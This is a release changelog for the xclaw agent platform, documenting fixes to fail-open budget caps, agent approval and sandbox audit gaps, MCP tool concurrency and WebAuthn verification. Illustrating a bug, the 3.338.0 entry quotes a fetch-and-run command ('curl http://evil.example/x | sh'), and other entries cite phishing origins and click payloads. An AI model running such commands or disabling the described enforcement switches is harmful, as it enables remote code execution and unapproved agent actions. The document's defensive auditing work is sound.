
  That is latent for names we own and live for names we do not. MCP tools join the
loop as `mcp__<server>__<tool>` with both halves supplied by a third party, so
the denylist is guarding an open namespace it can never enumerate. Against the
live config (deepwiki, github, linear) discovery returns 62 tools; before this
change 23 were parallel and every one of them qualified by substring alone,
including a real delete and a real write on the workspace. `partitionToolCalls`
put them in ONE concurrent batch:

      batches: 1
    PARALLEL save_status_update + delete_status_update + list_issues

  Classify on the leading verb of the final `__` segment instead — a read-only
intent is expressed by the verb, not by a word appearing somewhere in the name.
The trailing-noun rule that keeps `fabric_status` and `web_fetch` parallel is
restricted to names we own, because `update_status` ends the same way; a third
party earns parallelism at the verb or not at all.

  Both partitioners are fixed by this: `planes.partitionByConcurrency` calls
`getConcurrencyClass` directly and never sees FORCE_SERIAL, so a fix placed in
`isParallelSafeTool` would have repaired only one of the two.

  Parallelism is not reduced. The live 62 go from 23 parallel to 38 — the old
substring list never matched `get_document` or `get_issue`, so real getters were
running serially while two mutators ran concurrently.

  Suite 4563/4563.

  Generated with [XClaw](https://x.ai/)
Co-Authored-By: XClaw <noreply@xclaw.local>

## 3.348.0

### Fixed
- **Retry config: a range guard built from relational operators certified the one value that removes the retry.** `validateConfig`'s retry block tested `retry.retries < 0 || retry.retries > 20`. Both comparisons are false for a non-number, so `retries: "two"` was **accepted as valid** — while `99` (harmless: 100 attempts) and `-1` (harmless: clamped to one attempt) were rejected. The guard rejected the benign values and certified the catastrophic one. `withBackoff` then computed `Math.max(0, "two")` = NaN and looped `attempt <= NaN`, which is false on the first pass: the wrapped call was **never made even once**, and the function threw a bare `undefined` instead of an Error, so every downstream `catch (e) { e.message }` read nothing. The retry block now checks that a value is a finite number before asking where in the range it sits.
- **A malformed `baseMs`/`maxDelayMs` deleted the backoff instead of changing it.** Every computed delay became NaN, and `createBackoff`'s `if (ms <= 0) return` guard does not fire for NaN, so the timer was armed with NaN — which `setTimeout` coerces to 0. Measured wall time for a "backed-off" sleep: 1 ms. The protection removed is rate-limit backoff, and the trigger for a retry is precisely a 429 or an overload. Every numeric knob in `src/utils/backoff.mjs` now falls back to its default when it is not a finite number: `retries`, `baseMs`, `maxDelayMs`, and `prevDelayMs`, on both the jitter path and the Retry-After path (which clamps with `createBackoff`'s own cap and never reaches `computeJitterDelay`).

### Notes
- `retryAfterJitterRatio` is deliberately **not** routed through the fallback: a NaN ratio makes `retryAfterJitterRatio > 0` false, which skips the jitter and returns the server's hint untouched — already the safe outcome. A fallback there would change behaviour without fixing anything, so the line was removed rather than kept as untestable defence.
- Not extracted into a shared numeric-coercion helper with `src/seats/manager.mjs`'s `num()`: two call sites is not yet a pattern, and a new cross-module dependency edge for a four-line function costs more complexity than it removes.

## 3.347.0

### a malformed seat budget did not fail closed — it removed the cap

`resolveSeat` resolved six numbers with bare `??` and no validation, and
`checkSeatBudget` multiplies them into a cap: `dailyUsd * hardPct`. Any
non-numeric value anywhere in that product makes the cap `NaN`, and
`projected > NaN` is false for every spend forever. Measured against the real
module, a seat $100 over a $1 budget:

| seat config | resolved hard cap | $100 spend |
| --- | --- | --- |
| sane baseline | `1` | DENY |
| `defaultDailyUsd: "five"` | `NaN` | **ALLOW** |
| `hardPct: "one"` | `NaN` | **warn only, never denied** |
| `hardPct: 0` (deny everything) | `1` | strictest value discarded |
| `softPct: 1.5` | soft above hard | mid-band **ALLOW**, no warning |

The third row is the worst shape: the soft warning still fires, so the seat
looks enforced while the deny never happens.

The ordering defect needs no malformed value at all. The hard cap is tested
before the soft one, so a soft percentage at or above the hard one makes the
warning band unreachable — and an operator who tightens `hardPct` to `0.5`
leaves the default `softPct` of `0.8` above it. Tightening the cap is what
removes the warning that precedes it, and the seat jumps from allowed to
denied with nothing in between.

Fixed in `resolveSeat`: every number resolves through a finite-checked
candidate list (an explicit `null` still means unset, as `??` had it), and the
soft percentage is pulled below the hard one when it is not already. Zero stays
zero on both — `hardPct: 0` means deny everything and `softPct: 0` means warn
from the first cent; both are the strictest value, not an absent one.

Because `resolveSeat` now guarantees finite numbers, the consumer's
`(seat.hardPct || 1)` and `(seat.softPct || 0.8)` fallbacks are dead and are
removed — they were exactly what threw a strictest `0` away.

Seats are off in live config (`seats` is unset), so this ships as a guard on a
wired preflight path (`src/tokens/dual-preflight.mjs`), not as a live repair.

## 3.346.0

### tightening the budget switched off the budget's own savings mode

`limits()` in the cost governor resolves `dailyHardUsd` carefully — two
candidate ceilings (`cost.dailyHardUsd` and `autonomy.maxUsdPerDay`), both
filtered through `Number.isFinite`, stricter wins. `dailySoftUsd` sat on the
very next line with a bare `??`: no numeric validation, and no relationship at
all to the cap it is supposed to sit below.

That is not a missed warning. The soft cap is the default `economyAtUsd` — the
lower edge of the governor's economy band, the band that reroutes to cheaper
models specifically to avoid ever reaching the hard cap — and `bandFor` tests
`halt` first. A soft cap at or above the hard cap therefore makes the economy
band **unreachable**: spending goes straight from `normal` to `halt`, with no
downshift and no intermediate band alert.

No malformed config is needed to get there. An operator who tightens
`autonomy.maxUsdPerDay` to $3 pulls the hard cap to $3 while the configured
soft cap stays at $5 — so *tightening the budget* is what removes the
cost-saving machinery. Measured against the real module before the fix:

    defaults                        soft=5  hard=15  ->  normal ... economy ... halt
    autonomy tightened to $3        soft=5  hard=3   ->  normal, then halt at $4. no economy band
    soft cap "five"                 soft=NaN         ->  normal at every spend, to $20 and past it
    soft cap -1                     soft=-1          ->  economy from $0, forever

The soft cap is now taken only when it is a number strictly below the hard cap,
and otherwise falls back to the derivation the file already had
(`min(5, hard/2)`). A soft cap of `0` is kept as `0` — economy from the first
cent is the strictest legitimate setting, not an absent one. `perJobUsd` had
the identical shape one line down (`projected > NaN` is false for every job
forever) and is now validated the same way, falling through to
`agent.maxUsdPerJob` and then to `1`.

Live config is well-formed today (soft $25 / hard $60, no autonomy cap), so
this ships as a guard rather than a behaviour change — one `autonomy` edit
below $25 is all that separated it from firing.

## 3.345.0

### a lock nobody could look at

`reserveUsd` takes a file lease on the swarm ledger before it commits a
reservation (`acquireLease`, opt-in via `tokens.ledgerLease`). If the holder
dies mid-reserve the lease file survives until its 30s TTL expires, and every
other process asking for a reservation in that window gets
`SWARM_LEDGER_LEASE_HELD`.

`readLease` is the only function that can say who holds it and whether it has
expired. Its sole consumer in the entire repository was
`src/cli/doctor-swarm-ledger.mjs` — a module no production file imported. So
the two rows it pushes had never been emitted: a live `xclaw doctor` printed
134 rows and neither `cost.swarmLedger` nor `cost.swarmLedgerLease` was among
them. `/health` carries the ledger snapshot but not the lease, so the lock was
invisible on every surface xclaw has.

Wired into `doctor-ops-bundle.mjs`, doctor's single owner for these inserts.
Doctor now reports the day's spend against the cap, and the lease's owner and
expiry — `warn` + `EXPIRED` when a lease outlived its holder.

The regression test also pins what the bundle must NOT do: no row id may appear
twice. `doctor.mjs` carries a standing warning that re-invoking a probe there
printed every verdict two or three times and inflated the warning count doctor
exits on. Wiring one probe in two owners is exactly that bug.

## 3.344.0

### a spend cap of zero meant a spend cap of fifty

`cost.dailyHardUsd` is read by two independent resolvers. The cost governor's
`getCostLimits` validates it with `Number.isFinite` and honours whatever it
finds. The swarm ledger's `dailyHardUsd` ended `Number.isFinite(n) && n > 0 ? n
: 50`, so it treated the strictest possible setting — spend nothing — as an
absent one:

    cost.dailyHardUsd = 0   ->  governor $0    swarm ledger $50
    cost.dailyHardUsd = -5  ->  governor $-5   swarm ledger $50

One key, two readers, opposite meanings, and the disagreement resolved
fail-OPEN. It ACTS: `reserveUsd` gates every swarm child in `src/jobs/job.mjs`,
so an operator freezing swarm spend actually authorised $50 of it. The guard
now reads `Number.isFinite(n) ? Math.max(0, n) : 50` — zero is honoured, a
negative cap clamps closed, and only a value that is not a number falls back.

Honouring zero made `hard === 0` reachable for the first time, which exposed
the reporters: `pressure: hard > 0 ? (spent + reserved) / hard : 0` appeared
verbatim in `src/gateway/stop-health.mjs` and `src/cli/doctor-swarm-ledger.mjs`,
and under a zero cap it reads a fully-committed ledger as 0 — healthy. That
figure now comes from `ledgerPressure()` in the ledger module that owns it,
which returns 1 when the cap is zero and anything is committed. Two copies of a
formula became one; no new module.

## 3.343.0

### the gateway answered for the wrong machine

3.342.0 fixed one health check whose two branches probed two different
machines. The same shape survived in seven more places: every surface that
NAMES the computer built `http://${cfg.computer.host}:${cfg.computer.port}`
inline and so dropped `computer.remoteUrl`, while the verdict printed beside it
came from `isComputerRunning`, which honours it. `GET /health` returned a
remote-aware verdict next to a local-derived identity in one object —
`{"computer":"down","computerUrl":"http://127.0.0.1:35503"}` — naming two
different machines in the same breath.

`GET /computer/health` was worse, because it does not only report: it FETCHES
the inline address and returns that machine's body verbatim as the answer.
Driven against a gateway configured with a dead remote and any listener on the
local port, it replied `200 {"ok":true,...}` — a stranger's health, presented
as the computer's, with nothing in the response to reveal the substitution.

All seven now ask `computerBaseUrl`, the helper the computer client already
uses: `/health`, `/gateway/info` (which gains a `url` field naming the address
its `healthy` verdict came from), `/computer/health`, the gateway doctor row,
the Control UI dashboard, the boot banner, and `xclaw status`. The
`/computer/health` 502 now names its `upstream`, matching the contract
`computer-proxy` already had, so a failure says which machine was unreachable.

## 3.342.0

### doctor graded the wrong machine healthy

The `computer.health` row ran two probes in one if/else, and they asked two
different machines. The first derived `http://${host}:${port}` inline and never
looked at `computer.remoteUrl`; the fallback went through `isComputerRunning`,
which routes via `computerBaseUrl` and does. On a host where the computer is
remote, that made the row fail open: any process still listening on the local
port — including, before 3.341.0, the stray servers the readiness gate itself
spawned — answered the first probe, and doctor printed `Computer :4243 up`
while the machine every computer tool call actually reaches was down.

The row is now one probe, through the address the computer client itself uses,
and it names that address instead of a bare port number. The remedy follows the
target: telling an operator to `start with: xclaw gateway` cannot make someone
else's machine healthy, so a remote failure points at `computer.remoteUrl`.

The decision moved into `src/cli/doctor-computer-health.mjs`. `runDoctor` loads
the real config itself, so anything written inline in it is untestable by
construction — which is how a health check that grades the wrong host shipped in
the first place.

## 3.341.0

### The readiness gate healed the wrong machine

Four places in this codebase derive the computer's address. Three of them —
`computerBaseUrl` in `src/computer/manager.mjs`, the agent client, and
`capability-reach` — honour `computer.remoteUrl`. The fourth,
`ensureComputer`, re-derived the address inline: it duplicated
`computerProbeHost`'s wildcard normalisation byte for byte and dropped the
remote branch.

It is also the only one of the four that takes an action. On a host configured
with `XCLAW_COMPUTER_URL` or `computer.remoteUrl`, the health probes went to
the remote correctly (they go through `computerBaseUrl`), but when the remote
was down `ensureComputer` spawned up to `attempts` local computer servers that
no probe would ever look at, and then reported

    Computer not healthy at http://127.0.0.1:4243

naming an address it had never probed. The operator was sent to the wrong
machine while stray processes accumulated on this one.

`computer.remoteUrl` is this codebase's own "not our process" predicate —
`reuseEnabled` in `src/agent/computer-client.mjs` already says so. The gate now
derives its target with `computerBaseUrl` and, when a remote is configured,
reports the remote's health without starting anything locally.

### Giving up printed nothing

The exhaustion path computed an error string and returned it. Every other
branch logs; this one did not, even with `log: true`, and all four production
call sites discard the return value — so the string had no reader. A run that
started the computer successfully and a run that never got it up produced
byte-identical output. The give-up reason is now logged where the attempts are.

## 3.340.0

### The computer plane refused the safe action and permitted the actuating one

`hooks-bridge.mjs` fronts the browser enforcement plane for the computer
process. Three of its four entry points returned `{ ok: true, skipped: true }`
when the hooks module could not be loaded; only `runBeforeNavigate` carried a
fail-closed guard. Its single caller — the browser tool in
`src/computer/xclaw-server.mjs` — checks `r.ok === false` and nothing else, so
a skip and an approval are the same value to it.

`beforeInput` is the gate that carries the A7 jsCode policy
(`assertJsCodeAllowed`), the motor-role check (`assertMotorAllowed`) and the
tab lease. So with the hooks plane unavailable under full enforcement, the
substrate refused a navigation and permitted a click. Measured before the fix,
with `XCLAW_FABRIC_ENFORCE=1` and the hooks module unresolvable:

    runBeforeNavigate -> {"ok":false,"code":"HOOKS_UNAVAILABLE",...}
    runBeforeInput    -> {"ok":true,"skipped":true}

the input context carrying
`jsCode: "document.querySelector('#confirm-transfer').click()"` — permitted,
with the jsCode policy, the role check and the lease all silently skipped.

The guard is now one predicate, `hooksEnforcementOn()`, applied to both gates.
It also closes two narrower holes in the copy it replaces. The bridge accepted
only `"1"`, while `hooks.mjs`'s own `fabricEnforce()` accepts `"1"` or
`"true"` — so `XCLAW_FABRIC_ENFORCE=true` turned enforcement on inside the
hooks module while the bridge's guard did not recognise it. And, as in
3.339.0, the predicate read the environment only: a host hardened the
documented way, `profile: "prod"` in the config, left every `XCLAW_*`
variable unset and got no guard. It now asks `isHardenedProfile()`.

Deliberately not changed, because the fix would have no reader:

- `runAfterAction` also skips silently, but its only caller discards the
  return inside a swallowing `try/catch`. The missing audit receipt is real;
  the fix belongs where the receipt is consumed, not here.
- `runBuildChromeArgs` returns argv rather than a verdict, so the H0 invariant
  flags are absent rather than refused when hooks are missing.
- `fabricEnforce()` in `src/browser/hooks.mjs` is the third copy of the
  environment-only shape, but it gates the tab-lease protocol, whose
  acquisition side is separately gated on `XCLAW_TAB_LEASE_AUTO`. Giving it a
  profile route would refuse every browser action on a hardened host with
  nothing to acquire leases.

## 3.339.0

### A7 enforcement asked a variable nothing ever sets

`jscodeMode()` and `strictMode()` each decided whether the host was hardened
with a bare `process.env.XCLAW_PROFILE === "prod"`. Nothing in `src/` or
`bin/` assigns that variable — only harness scripts do — so an operator who
hardened the host the documented way, `profile: "prod"` in `xclaw.json`, left
it unset. Both gates fail open, so both switched themselves off while every
other gate agreed the host was prod: `isHardenedProfile(cfg)` true, egress
`deny`. The canonical alias `strict`, which sixteen source files treat as the
hardened profile, missed the raw compare from the environment too.

Measured before the fix, on a host whose config file said `profile: "prod"`:
`assertJsCodeAllowed("document.querySelector('#pay').click()")` returned
`{ ok: true, mode: "allow" }` — the whole motor-pattern policy off — and an
unbound session resolved to `actor` instead of being downgraded to
`observer`, so it actuated with a role it had never claimed.

Both gates now ask `isHardenedProfile()`, the predicate whose own comment
calls it "the single answer to 'is this host hardened?'". `loadConfig`
publishes the settled profile name through `setActiveProfile` so gates below
the config layer — a browser hook reached through the computer bridge cannot
be handed a cfg — can ask the same question and get the same answer. An
explicit source still outranks the published one.

The doctor compounded it: `mode === "allow"` was graded `ok` with the text
"jsCode allow (lab)", an affirmative pass asserting the host is a lab, on the
one host where that claim is wrong. The grade now depends on whether the host
is hardened, and lives in a pure `gradeJsCodePolicy` because the probe calls
`loadConfig` itself and cannot be driven from a test. A third hand-rolled
copy of the same predicate in doctor's prod-expectations block is gone.

## 3.338.0

### security-audit: grade the switches that DISABLE enforcement

The audit printed an affirmative ok for a protection a second, unreported
switch had turned off. `bindSystemRunPlan on (frozen argv/cwd/exe before
approval)` came from the binding flag alone, but freezing the plan and
CHECKING it at spawn are two switches: with `spawnEnforce=off`,
`assertPlanAtSpawn` returns `enforced: false` for any command, so a plan
frozen on `echo safe` still let `curl http://evil.example/x | sh` run.
Measured before the fix: `ok: true`, 0 errors, zero rows mentioning
spawnEnforce.

Two more disable-switches had no reporter at all: `mcpAutoApprove` blanket-
approves every `mcp__<server>__<tool>` call, and `osSandboxUnshareNet: false`
removes the network namespace, which under a deny/allowlist egress policy is
the boundary. Each row is graded through the owning module's own predicate —
`getSpawnEnforceMode`, `shouldUnshareNet`, `getEgressPolicy` — so an
env-disabled host is seen and the two can never diverge. The netns row is
emitted only when the egress policy makes it load-bearing.

Also removes a dead branch in `getSpawnEnforceMode` whose comment claimed
prod defaults to strict: both arms returned `"check"`, in every release.

## 3.337.0

### security audit was blind to bypassApprovals, the strongest switch it exists to report

`xclaw security-audit` on a full-autonomy host printed `ok: true`, 0 errors,
0 warnings and exited 0 — under a row reading "autoApprove off". It graded
`security.autoApprove` and never mentioned `security.bypassApprovals`, the
strictly stronger sibling: autoApprove auto-grants *within* the tier bounds,
bypassApprovals removes the gate outright. The plausible neighbouring row is
what made the absence invisible.

Adds a `security.bypassApprovals` row graded on the precedent already in the
file — warn unhardened, error hardened, error unconditionally for bypass +
`criticalOverride: "legacy"` — plus an explicit `ok` row when off, so its
absence is visible too. Corrects two false claims in the approvals.mjs
comment, both grepped: there is no gateway boot log for bypassApprovals, and
"nothing is ever asked at any risk tier" is untrue — critical still pends
unless criticalOverride is "legacy". doctor already reported this via
`validateConfig`; two subsystems agreeing about one setting is consistency,
not duplication, so that stays.

## 3.336.0

### The registration half now checks the ceremony context too

The §7.1 sibling of 3.335.0's assertion fix. `completeRegistration` treated
clientDataJSON as optional and, when present, checked only the challenge.
Measured before the fix: an assertion response (`type: "webauthn.get"`)
replayed as a registration was accepted, and a credential minted on
`https://evil.example` — the origin a victim's browser stamps into
clientData when phished — registered and would then gate everything from
then on. clientDataJSON is now required (a check that vanishes when the
field is omitted is decorative), and `type === "webauthn.create"` and the
configured origin are enforced, each mutation-verified. Attestation
verification remains a documented recommendation — registration is an
operator-side flow; the assertion is the gate.

### An ephemeral port was unrequestable, so a test gambled against the live gateway

`startComputerAuthProxy` resolved its port with `opts.listenPort || … || 4244`,
so `listenPort: 0` — "bind an ephemeral port" — was silently rewritten to the
default. The test that needed one resorted to a random port in 18000–18999, a
range that contains 18790, the live gateway: on collision its fetches reached
the gateway's open `/health` instead of the proxy (200 without a token, wrong
body — the failure looked like the proxy's and was the fixture's; caught as a
1-in-1000 full-suite failure on this host). `??` now honors 0, the listen log
reports the BOUND port, and the test binds ephemeral, reads the port back, and
pins that 0 is not rewritten.

## 3.335.0

### An assertion's signature was verified; the ceremony it signed for was not

`completeAssertion` (the WebAuthn gate's second half, signature-verified since
3.332.0) checked challenge, signature and counter — and nothing else about
what the signature actually covered. The ceremony context lives INSIDE the
signed payload (WebAuthn L2 §7.2), and each unchecked field is a way a
signature obtained in another context verifies here. Measured before the fix,
all four forgeries were accepted, each signed with the registered credential's
real key:

- `clientData.type` unchecked: a `webauthn.create` (registration) response
  replayed as an assertion — cross-protocol confusion.
- `clientData.origin` unchecked: a phishing page's assertion — which the
  victim's real authenticator happily signs, over clientData naming the evil
  origin — opened the gate.
- `authData.rpIdHash` unchecked: an assertion scoped to a different relying
  party verified against this one.
- UP flag unchecked: a response produced with no human present passed a gate
  whose purpose is proving a human is present.

All four are now enforced before the store is touched (rpIdHash via
`crypto.timingSafeEqual`), each with its own error code, each check
mutation-verified individually. The registration half still stores unverified
attestation by design (documented; registration is an operator-side trusted
flow) — verifying attestation remains a recommendation, not this fix.

## 3.334.0

### Queue aggregates and sweeps saw a page of the queue, not the queue

`queueStats`, `listDeadLetter`, `retryFailedQueue` and `clearCompletedQueue`
each derived their input from `listQueue(cfg, { limit: 500 })` — the same
display limit v3.333.0 removed from admission. listQueue sorts queued items
FIRST, so on a queue holding 500+ queued records the page contains nothing
else. Measured, 500 queued + 2 failed + 1 succeeded on disk: `queueStats`
reported `total=500, failed=0` (this feeds the `xclaw_queue_jobs` Prometheus
gauge, which therefore saturated at 500 with no signal), the dead-letter list
was empty, retry requeued nothing and clear removed nothing — every one of
them reporting a successful zero. All four now census the whole queue; the
limit never saved work, since listQueue parses every record before slicing.

The two remaining paged reads are correct BY the sort and stay paged:
`processNext` (limit 100) needs only the top aged-priority queued item, which
the sort puts in the page; the drain check (limit 20) needs only "does any
queued item exist", and queued sorts first.

## 3.333.0

### Any queue.maxDepth above 500 silently disabled the finite buffer

`enqueueJob` compared `maxDepth` against a queued-count derived from
`listQueue(cfg, { limit: 500 })`. That limit exists to bound a display; the
sort puts queued items first and the slice then caps the count at 500. An
operator who raised `queue.maxDepth` past 500 — a setting the config accepts,
uncapped — got an admission check whose measured depth was pinned below the
bound, so it could never refuse. The finite buffer, the entire purpose of
`maxDepth`, was off, and nothing reported it. The limit saved no work either:
listQueue reads and parses every record before it slices. `countQueued()` now
counts the queue, not a page of it.

### The bound an admission decision enforced was whatever a concurrent caller had configured last

`enqueueJob` configured the process-wide admission singleton, then awaited the
queue count (fs I/O — the event loop yields), then called `tryAdmit`, which
read the singleton's stored `maxDepth`. Inside that window any concurrent
caller that also configures the singleton — `processNext` does, once per pick,
with ITS cfg's resolved defaults — rewrote the bound, and the decision
enforced the other caller's number. Measured under 12 CPU spinners: a queue
seeded to its `maxDepth` admitted anyway in 4/20 runs while instrumentation
proved the depth count was correct every time — the count was right, the bound
had been widened mid-await. `tryAdmit` now takes the bound as an input of the
decision, captured by `enqueueJob` before the await; the stored bound remains
the default for callers that pass none.

### A test that raced the worker it had started

`test/batch-queue.test.mjs` enqueued one job for real and expected the second
to be refused at `maxDepth: 1`. A successful enqueue kicks the worker, and
50ms later `processNext` moves that record out of `queued` — freeing the very
slot the refusal depended on (by design: `maxDepth` bounds queued items, not
running ones). The assertion held only while item two arrived inside the 50ms
window; under CPU load it did not. The buffer is now seeded on disk, so
nothing kicks a worker and the depth cannot move under the assertion.

## 3.332.0

### The WebAuthn ceremony had no second half, and the half it was missing accepted any assertion

`xclaw auth webauthn` is a two-round-trip protocol and only the FIRST half of
each round trip was invocable. `register-options` and `assert-options` issued a
challenge; `completeRegistration` and `completeAssertion` — the halves that
consume it — had no CLI action and no production caller at all. So on a real
host no credential could ever be registered (`status` reported `registered: 0`
right after `register-options`, live), and `gateWithWebAuthn`'s own remedy
string told the operator to run `xclaw auth webauthn register`, a command that
did not exist.

`webauthnBrowserSnippet()` — the operator's only instruction for driving the
ceremony — was false in every line. It fetched `/xclaw/webauthn/register-options`
and `/xclaw/webauthn/assert-options`, which appear in no route table, and then
told the operator to "send cred to completeRegistration", the function with no
invocable path. An instruction string is a claim about the product.

Wiring the missing half is only safe because the assertion is now verified.
`completeAssertion` checked no signature: the file said "Production should use
full WebAuthn verify (COSE key + authData)" while a complete, tested 591-line
ES256 verifier sat two files away with zero production importers. The feature
failed CLOSED only because nothing could register a credential to assert
against — restore the command first and it would have become a live auth
bypass, so verification lands first.

- `completeAssertion` now verifies `authenticatorData || SHA256(clientDataJSON)`
  against the stored public key with `verifyEs256Raw`, and every rejection
  returns before the store is touched (a refused assertion that still stamped
  `lastAssertAt` would open the gate it just refused).
- The counter read `assertion.authenticatorData?.counter` — undefined for the
  base64url string an authenticator actually sends — and fell back to
  `cred.counter + 1`, so clone detection was grading a number it had invented
  itself. It now reads `authData.readUInt32BE(33)`.
- `importEs256PublicKey` rejected base64url SPKI DER, the encoding a browser
  produces (`getPublicKey()`) and the one this module stores. Its Buffer branch
  had always accepted those bytes; only the string branch could not. A stored
  credential was unverifiable by the one verifier able to verify it.
- New `xclaw auth webauthn register <file|->` and `assert <file|->` read the
  browser payload from a file or stdin.

`gateWithWebAuthn` still has no production caller and `requireAssertBeforeUse`
defaults false, so no agent path changes behaviour; this is the operator CLI.

Not covered here, and still open: `completeAssertion` does not check
`rpIdHash`, `clientData.type`, or origin. Challenge binding covers replay; those
are defence in depth.

## 3.331.0

### A duplicate `case` label silently deleted ~220 lines of shipped CLI

`bin/xclaw.mjs` dispatches every command from one `switch (cmd)`. It contained
two `case "auth"` and two `case "merge"`. JavaScript runs the FIRST matching
case and never warns about the second, so both later blocks were unreachable
code that no build, no lint and no test ever complained about.

What was dead, in every release up to 3.330.0:

- `xclaw auth connected …` (the connected-OAuth provider vault), `xclaw auth
  token`, `xclaw auth accounts …` — all implemented, all exiting 1 on a real
  host. Live proof before the fix: `auth accounts list`, `auth connected list`
  and `auth token` exited 1 while `auth status` exited 0.
- `xclaw merge <subagentId>` — the subagent worktree merge. `merge` reached the
  swarm merge-proposal CLI instead, which takes ids of a different kind.

Why it stayed invisible from both sides: the shadowed block's own usage text
never mentioned the shadowing command, and the live auth CLI's usage text never
mentioned the shadowed subcommands. Each half was self-consistent; only the
dispatch table showed the collision.

Fixed:

- The shadowed auth block is now `src/cli/auth-legacy-cli.mjs`, and the live
  `runAuthCli` delegates `connected` / `token` / `accounts` (and
  `login --connected|--oauth`) to it before printing usage. A rename nobody can
  invoke is not a restoration.
- The worktree merge is `xclaw merge-worktree <subagentId>` — additive, so the
  existing `merge` keeps its meaning.
- `test/cli-command-shadowing.test.mjs` scans the dispatcher for duplicate
  labels (asserting the scanner still finds >60 cases, so a reformat cannot
  turn it into a census that finds nothing and grades itself passing) and
  proves the restored commands reach a handler on a real argv in a subprocess,
  rather than proving a handler merely exists.

## 3.330.0

### The isolation enforcer nothing called, and the one breach the sandbox cannot see

`src/security/workspace-isolation.mjs` exports three functions. A census of its
importers returned two files, both of them its own tests. Zero production
callers. Two green test files asserted that cross-peer isolation is enforced,
and nothing in the running system called the enforcer.

The honest split of that finding:

- Path isolation IS enforced. `src/agent/loop.mjs` calls
  `guardToolPaths(cfg, workingDir, ...)`, and `workspaceForChat` supplies the
  per-chat `workingDir`, so a chat cannot read outside its own workspace.
  `assertIsolatedPath` and `resolvePeerWorkspace` are redundant, not missing.
  They are left in place: a security-shaped capability is surfaced as a
  recommendation, never deleted in passing.
- One misconfiguration the sandbox structurally cannot catch: two chats mapped
  to the SAME root, or one nested inside the other. The sandbox roots itself at
  each chat's workspace, so when two chats share a root every path is inside
  both workspaces and every check passes, by construction. The operator has
  configured isolation and has none. `validateWorkspaceMap` is exactly the
  predicate that detects this — written, tested, and wired to nothing.

Proven before the fix, against the shipped 3.329.0 CLI on an isolated HOME
carrying three overlapping-root misconfigurations (same root, nested root,
alias key): `5 error(s), 18 warning(s)` — not one of them about workspaces.

Two divergences were sitting on top of it:

- `workspaceForChat` reads `workspaceByChatId || workspaces` — two live key
  spellings — while the validator read only the first. A reader that checks one
  spelling reports on half the configs the runtime honours. Both now come from
  one `chatWorkspaceMap` in `src/channels/policy.mjs`, at the source, rather
  than by copying the fallback chain into a second file.
- The validator defaulted `channel = "telegram"` and had no caller to pass
  anything else. Channels are now derived from the config's own keys, so a
  further channel gaining the feature cannot produce a clean report while its
  chats share a root. Pairs are compared ACROSS channels too: isolation is a
  property of distinct peers, and peers span channels, so `telegram:111` and
  `slack:C1` on one root is the same breach.

`runSecurityAudit` now carries a `workspace.isolation` row — `warn`, `error`
under a hardened profile, matching the local convention. Guards against three
defect classes this codebase has already shipped once each: an absent map is
the default posture and reports nothing (a fault is not the same as no data);
exactly one row is emitted however many overlaps are found (two rows sharing an
id shipped here before); and roots are compared as resolved paths, so the
trailing slash an operator adds by habit cannot hide a breach.

## 3.329.0

### One profile name, three recognizers, and the unknown case failed open

`profile` is a free-form operator string. Three gates read it, each normalising
it differently, so "is this host hardened?" had three answers:

| `profile` | `enforceProdHardening` | prod audit rules | profile pack |
|---|---|---|---|
| `prod`   | hardens | applies | applied |
| `Prod`   | hardens (it lowercases) | **skipped** (raw `===`) | **none** (no `PROFILES.Prod`) |
| `strict` | **skipped** | **skipped** | **none** |
| `prd`    | skipped | skipped | none — and nothing said so |

`strict` is not a name I invented. `src/config/profiles.mjs` line 2 says
`prod (strict)`, and sixteen source files already test `profile === "strict"`
as the hardened case. The config layer was the one reader that never learned
the name — so an operator who wrote `strict`, following the codebase's own
vocabulary, got a host that sixteen modules treated as hardened and the three
that actually enforce anything treated as `dev`.

The unknown case is the fail-open one: a typo'd `XCLAW_PROFILE` applies no
pack and no hardening, so the host keeps whatever `autoApprove` the shared
config file carries while the operator believes they selected a profile. Its
only signal was a boot `console.warn` — an error channel with no reader
(class 14).

Fixed with one predicate rather than a longer list of literals, in the module
that owns profiles: `resolveProfileName` (trim, lowercase, alias table) and
`isHardenedProfile`, which both `enforceProdHardening` and the security audit
now call. A typo is **not** guessed at — `prd` could as easily have meant
`dev` as `prod` — it is reported as a machine-readable `profile.unknown`
audit error, quoting the operator's own spelling back at them, which
`doctor-audit-row.mjs` renders as a doctor row.

**A fourth writer, found by the mutation sweep.** `loadConfig` does
`deepMerge(cfg, user)` *after* `applyProfile`, which lands the user file's raw
`profile` string back on top of the canonical name — and the final re-stamp
covered only the env path. A config file saying `strict` therefore got the
prod pack **and** prod hardening but still reported `profile="strict"` to
`/metrics`, to doctor, and to every raw reader. One settling writer now
resolves the name once, last.

Severity, honestly: the live host is `profile: lab`, so there is no live
exposure. The exposure is for any operator who sets `strict` or typos
`XCLAW_PROFILE`.

Mutation sweep: 22 mutations, 21 RED. The survivor (`reapply-guard-raw`) is a
proven equivalent mutant — the double-apply is idempotent when both sides name
the same canonical profile; verified by config diff (8059 bytes byte-identical
both ways, the user's own `agent.maxTurns` intact). Four earlier survivors were
genuine holes: tests that composed `applyProfile` first were masking whether
the downstream gates could resolve a name themselves, so each gate is now
exercised directly with non-canonical input.

## 3.328.0

### A DM security check asked what the operator wrote, not what the channel enforces

`runSecurityAudit` graded DM exposure as `c?.dmPolicy === "open"` over a
hand-written list, `["telegram","discord"]`. Three holes, all in the same
sentence:

1. **Slack was not in the list at all.**
2. **Slack's open state is normally an absent field.** `channels/slack/index.mjs:74`
   is `conf.dmPolicy || "open"` — it is the only channel that defaults to open
   (telegram and discord both default `"pairing"`). So `{enabled: true}` is
   wide open and `=== "open"` is false.
3. **Slack discards `"pairing"` — the value the remedy recommended.** Its gate
   (`slack/index.mjs:133`) branches on `"allowlist"` alone; the file's own
   header says pairing "is NOT implemented for Slack (no pairing store) →
   open". The audit's fix string, `"Prefer pairing or allowlist"`, sent a Slack
   operator to a setting that silently does nothing.

Slack's source states the stakes: "Sender authorization — the sole gate for
Slack. Without it any sender in a monitored channel (poll) or any @mention
(socket) commands the agent."

Before-proof, the shipping audit run against synthetic `profile: "prod"`
configs on a clean 3.327.0 tree:

    slack {enabled}                        SILENT
    slack {enabled, dmPolicy:"pairing"}    SILENT
    slack {enabled, dmPolicy:"open"}       SILENT
    telegram {enabled, dmPolicy:"open"}    FINDING channels.telegram.dm=warn

**No live exposure.** The live host runs `profile: "lab"` with slack disabled
and telegram on `allowlist`. The defect is the audit's blindness, not an open
door.

The fix is not a longer literal — the three channels' gates genuinely differ.
`src/channels/dm-posture.mjs` is one table mirroring each channel's real gate
(its default, and the policies it actually enforces) behind `isOpenDm()`, plus
